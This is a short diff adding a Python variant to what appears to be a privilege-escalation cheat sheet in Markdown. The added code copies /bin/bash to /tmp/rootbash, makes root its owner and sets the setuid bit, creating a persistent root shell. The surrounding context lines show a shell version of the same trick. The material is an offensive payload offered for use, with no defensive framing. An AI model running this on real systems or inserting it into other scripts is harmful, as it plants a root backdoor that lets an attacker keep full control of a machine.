@@ -30,4 +30,17 @@ chmod +s /tmp/rootbash
 exit 0
 $ chmod +x /tmp/root.sh
 ```
+
+**Root Bash** (Python)
+
+```shell!
+import shutil
+import os
+
+source_path = '/bin/bash'
+destination_path = '/tmp/rootbash'
+shutil.copy2(source_path, destination_path)
+os.chown(destination_path, 0, 0)
+os.chmod(destination_path, 0o4755)
+```
 </div></div>
